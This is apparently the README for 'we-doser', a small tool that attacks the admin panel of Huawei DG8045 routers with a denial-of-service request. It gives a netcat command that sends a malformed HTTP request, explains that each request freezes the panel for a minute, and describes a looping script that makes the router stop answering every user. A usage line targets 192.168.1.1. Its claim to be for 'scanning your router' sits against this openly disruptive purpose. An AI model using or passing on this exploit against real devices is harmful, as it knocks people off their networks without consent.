# we-doser
Huawei Router - Dos Attack vulnerability on admin panel
Version : DG8045
---
you can send this request for the router using netcat , socket ,etc

```
$ nc 192.168.1.1 80
GET / HTTP1.1
```

note : one request = one minute
--
in my script you can send this request using while loop , now the router will not send any response for any user:)

<img src='src/we_doser.png'>

## Huawei Router Version : DG8045


## Usage
```$ python3 we_doser.py 192.168.1.1```


### Note : This Script for scanning your router from this vulnerability .! , use at your own risk


## By : <a href='https://facebook.com/knassar702'>Khaled Nassar</a> <a href='mailto:knassar702@gmail.com'>@knassar702</a>

